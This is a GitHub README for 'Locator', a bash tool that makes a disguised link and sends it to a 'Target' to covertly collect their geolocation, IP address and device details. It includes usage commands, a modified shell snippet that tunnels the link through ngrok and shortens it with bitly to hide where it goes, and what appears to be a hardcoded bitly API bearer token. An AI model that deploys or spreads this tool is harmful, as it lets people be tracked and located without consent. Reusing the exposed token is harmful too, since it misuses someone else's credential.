# Locator v1.2
## Author: github.com/thelinuxchoice/locator
## Modified by: github.com/itdaglog/locator-1
## IG: instagram.com/thelinuxchoice
### Don't copy this code without give me the credits, nerd! 

Geolocator, Ip Tracker, Device Info by URL (Serveo and Ngrok).
It uses tinyurl to obfuscate the Serveo link.

![loc](https://user-images.githubusercontent.com/34893261/43586620-7a766f4a-963e-11e8-8a47-5ff4039fbda0.png)

## Legal disclaimer:

Usage of Locator for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 


### Usage:
```
git clone https://github.com/thelinuxchoice/locator
cd locator
bash locator.sh
```

### Donate!
Support the authors:

<noscript><a href="https://liberapay.com/thelinuxchoice/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>

### Modified
```
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | ./jq -r '.tunnels[0].public_url' > link.txt)
send_link=$(cat link.txt)
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $send_link

bitly=$(curl -s --location --request POST 'https://api-ssl.bitly.com/v4/shorten' --header 'Authorization: Bearer 4829231012ed0febfc5a1cb741df0f2e934abe40' --header 'Content-Type: application/json' --data-raw '{"long_url": "'$send_link'"}' | ./jq -r '.id')
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using bitly:\e[0m\e[1;77m %s \n' $bitly
```

### Software Included
```
- ngrok for linux
- jq for linux

```

### Notes for Termux User: 

If you're using Termux 
1. Please delete ngrox and jq files, because the files included is only for Linux
2. Modify these of lines as below:

Coba ganti baris ke 345 dan 347: 
```
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | ./jq -r '.tunnels[0].public_url' > link.txt)

send_link=$(cat link.txt)
```

Menjadi seperti ini:
```
link=$(curl -s -N http://localhost:4040/api/tunnels > link.txt)

send_link=$(cat link.txt | cut -d',' -f3 | cut -d '"' -f4)
```
